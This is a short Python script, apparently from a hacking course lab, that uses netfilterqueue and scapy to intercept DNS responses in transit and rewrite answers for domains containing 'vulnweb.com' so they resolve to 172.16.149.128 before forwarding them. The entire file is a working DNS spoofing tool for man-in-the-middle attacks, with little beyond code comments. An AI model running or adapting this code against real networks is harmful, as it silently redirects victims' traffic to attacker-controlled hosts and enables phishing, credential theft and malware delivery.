#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
from scapy.layers.l2 import *

scapy.conf.verb = 0


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # see if scapy has a DNS response
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "vulnweb.com" in qname.decode():
            print("[+] Spoofing Target")
            # use scapy to create dns response and asnwer count
            answer = scapy.DNSRR(rrname=qname, rdata="172.16.149.128")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            # remove ip and UDP  checksum and len

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # set the packet so the modified packet gets forwarded
            packet.set_payload(bytes(scapy_packet))


    # print(scapy_packet.show())
    # show the packet payload, need to be converted to a scapy packet to manipulate it
    # forwards the packets with .accept()
    packet.accept()
    # drop the packet
    #packet.drop()


queue = netfilterqueue.NetfilterQueue()
# use bind to identify the queue number
queue.bind(0, process_packet)
queue.run()
